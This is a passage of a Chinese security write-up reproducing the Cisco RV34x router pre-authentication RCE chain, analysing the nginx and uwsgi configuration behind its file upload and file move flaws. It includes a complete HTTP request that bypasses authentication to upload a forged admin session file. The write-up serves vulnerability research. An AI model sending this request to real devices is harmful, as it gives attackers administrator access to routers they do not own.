@@ -1,0 +1,205 @@
+**作者：f-undefined团队 f0cus7  
+原文链接：**
+去年一整年Cisco RV34x系列曝出了一系列漏洞，在经历了多次修补之后，在年底的[Pwn2Own Austin
+2021](https://www.thezdi.com/blog/2021/8/11/pwn2own-austin-2021-phones-printers-nas-and-more)上该系列路由器仍然被[IoT Inspector Research Lab](https://www.iot-inspector.com/about-us/)攻破了，具体来说是三个逻辑漏洞结合实现了`RCE`，本文将基于该团队发布的[wp](https://www.iot-inspector.com/blog/advisory-cisco-rv340-dual-wan-gigabit-vpn-router-rce-over-lan/)进行复现分析。
+## 漏洞简介
+漏洞公告信息如下，影响的版本是`1.0.03.24`之前，受影响的产品除了`RV34x`之外，还包括`RV160`、`RV160W`、`RV260`以及`RV260W`系列。
+    Affected vendor & product
+    Vendor Advisory
+    Cisco RV340 Dual WAN Gigabit VPN Router (https://www.cisco.com/)
+    https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-smb-mult-vuln-KA9PK6D.html
+    Vulnerable version  1.0.03.24 and earlier
+    Fixed version   1.0.03.26
+    CVE IDs CVE-2022-20705
+    CVE-2022-20708
+    CVE-2022-20709
+    CVE-2022-20711
+    Impact  10 (critical) AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    Credit  Q. Kaiser, IoT Inspector Research Lab
+无条件`RCE`的实现是由三个漏洞一起构成的，包括：
+  * 任意文件上传漏洞；
+  * 任意文件移动漏洞；
+  * 认证后的命令注入漏洞。
+通过前两个漏洞实现了有效`session`的伪造，利用伪造的`session`具备了访问认证后页面的能力，后续再利用认证后命令注入漏洞实现`rce`。
+## 漏洞分析
+此次的分析是基于固件版本[1.0.03.24](https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.24)进行的，下载固件使用`binwalk`进行解压，刷新到路由器当中以方便后续动态调试验证。
+此次漏洞分析的基础有两个，一个是要能看懂`nginx+uwsgi`架构组成的`web`框架配置，尤其是`nginx`配置文件的了解；一个是要能知道`cisco
+ConfD+yang`实现的后端数据中心服务。前者可以通过搜索`nginx+uwsgi
+配置`实现，特别是需要`nginx`上传模块的配置，可参考[Nginx-upload-module中文文档](https://blog.osf.cn/2020/06/30/nginx-upload-module/)；后者资料不多，需要啃官方文档，可以先了解`netconf+yang`的网络管理模型，然后再查看官方文档[ConfD User
+Guide](https://manuals.plus/wp-content/sideloads/software-tail-f-confd-user-guide-original.pdf)来掌握。
+### 任意文件上传漏洞
+认证前任意文件上传漏洞以及任意文件移动漏洞认证前的功能都是因为`nginx`的不正确配置所导致的，先来看任意文件上传漏洞。
+`nginx`的主配置文件是`/etc/nginx/nginx.conf`，从它的内容当中可以看到对应的用户权限是`www-data`，
+    # /etc/nginx/nginx.conf
+    user www-data;
+    worker_processes  4;
+    error_log /dev/null;
+    events {
+        worker_connections  1024;
+    }
+    http {
+        access_log off;
+        #error_log /var/log/nginx/error.log  error;
+        upstream jsonrpc {
+            server 127.0.0.1:9000;
+        }
+        upstream rest {
+            server 127.0.0.1:8008;
+        }
+        # For websocket proxy server
+        include /var/nginx/conf.d/proxy.websocket.conf;
+        include /var/nginx/sites-enabled/*;
+    }
+加载的配置是`/var/nginx/conf.d/proxy.websocket.conf`以及`/var/nginx/sites-enabled/*`。
+    /usr/bin # ls /var/nginx/sites-enabled/
+    web-rest-lan  web-wan
+可以在`/etc/nginx/sites-available/web-rest-lan`中看到它加载了`lan.rest.conf`以及`web.upload.conf`这两个配置文件。
+    # /etc/nginx/sites-available/web-rest-lan
+    ...
+    server {
+        server_name  localhost:443;
+        #mapping to Firewall->Basic Settings->LAN/VPN Web Management, it will generate by ucicfg
+        ...
+        include /var/nginx/conf.d/lan.rest.conf;
+        ...
+        include /var/nginx/conf.d/web.upload.conf;
+        ...
+    }
+`nginx`的所有模块的配置都存储在`/etc/nginx/conf.d`当中，其中与`lan.rest.conf`对应的是`rest.url.conf`，其内容如下：
+    # /etc/nginx/conf.d/rest.url.conf: 13
+    location /api/operations/ciscosb-file:form-file-upload {
+        set $deny 1;
+        if ($http_authorization != "") {
+            set $deny "0";
+        }
+        if ($deny = "1") {
+            return 403;
+        }
+        upload_pass /form-file-upload;
+        upload_store /tmp/upload;
+        upload_store_access user:rw group:rw all:rw;
+        upload_set_form_field $upload_field_name.name "$upload_file_name";
+        upload_set_form_field $upload_field_name.content_type "$upload_content_type";
+        upload_set_form_field $upload_field_name.path "$upload_tmp_path";
+        upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
+        upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
+        upload_pass_form_field "^.*$";
+        upload_cleanup 400 404 499 500-505;
+        upload_resumable on;
+    }
+结合`proxy.conf`内容可以看到，当请求头中的`Authorization`不为空的时候，此时`$deny`会被设置为`0`，并调用`upload`模块，存储的路径是`/tmp/upload`。因为`upload_store`没有配置`level`，所以`nginx`会默认将上传的数据按`/tmp/upload/0000000001`数字命名的方式顺序存储。
+    # etc/nginx/conf.d/proxy.conf，
+    proxy_http_version 1.1;
+    proxy_set_header Host $http_host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Authorization $http_authorization;
+    proxy_set_header Accept-Encoding "";
+    proxy_set_header Connection "";
+    proxy_ssl_session_reuse off;
+    server_name_in_redirect off;
+从上面的配置可以看出，在调用`/form-file-upload`之前，`nginx`已经将用户上传的数据存储到了`/tmp/upload`当中，同时存储的名字又是可以预测的，后续它还会调用`upload_set_form_field`等方法将表单中的字段进行替换，并最终调用`/form-file-upload`。
+在这里调不调用`/form-file-upload`我们并不关心，因为在`/form-file-upload`之前我们已经可以实现任意文件上传的功能了。具体来说是先通过在`HTTP`请求包中加入一个`Authorization`头，这样绕过了认证触发了上传模块；而后我们上传的数据就会被存储到`/tmp/upload`当中，同时名字也可以可以遍历得到。
+利用该漏洞最终实现的效果就是可以无条件的在`/tmp/upload`目录当中上传任意文件，其文件名类似为`/tmp/upload/0000000001`，数字由上传文件的序列决定，可以通过遍历实现。
+发送请求包如下所示：
+    POST /api/operations/ciscosb-file:form-file-upload HTTP/1.1
+    Host: 192.168.1.1
+    Authorization: 123=456
+    Cookie: selected_language=English; session_timeout=false; sessionid=2727f44696347c5e1218c78a2471f1c48ab9e6f4a9c3b3b6ab1db9a1365fd620; user=cisco; blinking=1; config-modified=1; disable-startup=0; redirect-admin=0; group=admin; attributes=RW; ru=0; bootfail=0; model_info=RV345; fwver=1.0.03.24; current-page=Admin_Config_Management
+    Content-Length: 854
+    Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
+    Accept: application/json, text/plain, */*
+    Optional-Header: header-value
+    Sec-Ch-Ua-Mobile: ?0
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBtdH1UtBT6GPZrcM
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+    Sec-Ch-Ua-Platform: "macOS"
+    Origin: https://192.168.1.1
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Dest: empty
+    Referer: https://192.168.1.1/index.html
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+    Connection: close
+    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
+    Content-Disposition: form-data; name="sessionid"
+    2727f44696347c5e1218c78a
+    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
+    Content-Disposition: form-data; name="pathparam"
+    a
+    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
+    Content-Disposition: form-data; name="file.path"
+    a
+    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
+    Content-Disposition: form-data; name="fileparam"
+    a
+    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM
+    Content-Disposition: form-data; name="websession"; filename="a.xml"
+    Content-Type: text/xml
+    {
+      "max-count":1,
+      "cisco":{
+        "4a04cd411434cea78f2d81b692dfa4a41aea9e4b15536fb933fab11df8ed414a":{
+          "user":"cisco",
+          "group":"admin",
+          "time":315156,
+          "access":1,
+          "timeout":9999,
+          "leasetime":15275860
+        }
+      }
+    }
+    ------WebKitFormBoundaryBtdH1UtBT6GPZrcM--
+### 任意文件移动漏洞
+第二个漏洞存是任意文件移动漏洞，可以实现任意文件移动。漏洞的原理是`nginx`未做权限限制同时后端也没有对权限进行认证，导致权限绕过；后端在实现过程中没有对输入校验导致任意文件移动。
+下面来对该漏洞进行详细的分析。
+先是权限绕过漏洞分析，`/etc/nginx/conf.d/web.upload.conf`内容如下，可以看到`nginx`对`/upload`请求进行了`session`的验证（权限的判定），但它却没有对`/form-file-upload`请求进行权限校验，用户可以不需要任何权限直接请求`/form-file-upload`。
+    # /etc/nginx/conf.d/web.upload.conf
+    location /form-file-upload {
+        include uwsgi_params;
+        proxy_buffering off;
+        uwsgi_modifier1 9;
+        uwsgi_pass 127.0.0.1:9003;
+        uwsgi_read_timeout 3600;
+        uwsgi_send_timeout 3600;
+    }
+    location /upload {
+        set $deny 1;
+            if (-f /tmp/websession/token/$cookie_sessionid) {
+                    set $deny "0";
+            }
+            if ($deny = "1") {
+                    return 403;
+            }
+        upload_pass /form-file-upload;
+        upload_store /tmp/upload;
+        upload_store_access user:rw group:rw all:rw;
+        upload_set_form_field $upload_field_name.name "$upload_file_name";
+        upload_set_form_field $upload_field_name.content_type "$upload_content_type";
+        upload_set_form_field $upload_field_name.path "$upload_tmp_path";
+        upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
+        upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
+        upload_pass_form_field "^.*$";
+        upload_cleanup 400 404 499 500-505;
+        upload_resumable on;
+    }
+去看`/form-file-upload`的后端处理程序，前面说过后端是使用`uwsgi`实现的，其服务启动的命令如下：
+    # usr/bin/uwsgi-launcher: 5
+    #!/bin/sh /etc/rc.common
+    start() {
+        uwsgi -m --ini /etc/uwsgi/jsonrpc.ini &
+        uwsgi -m --ini /etc/uwsgi/blockpage.ini &
+        uwsgi -m --ini /etc/uwsgi/upload.ini &
+    }
+可以看到`/form-file-upload`对应的`uwsgi_pass`目的地是`127.0.0.1:9003`。对应的是`uwsgi`启动的服务，配置文件的路径是`/etc/uswgi/upload.ini`，从该文件的内容中可以看到，对应的后端处理程序是`/www/cgi-bin/upload.cgi`。
+    # /etc/uswgi/upload.ini
+    [uwsgi]
+    plugins = cgi
+    workers = 1
+    master = 1
+    uid = www-data
+    gid = www-data
+    socket=127.0.0.1:9003
+    buffer-size=4096
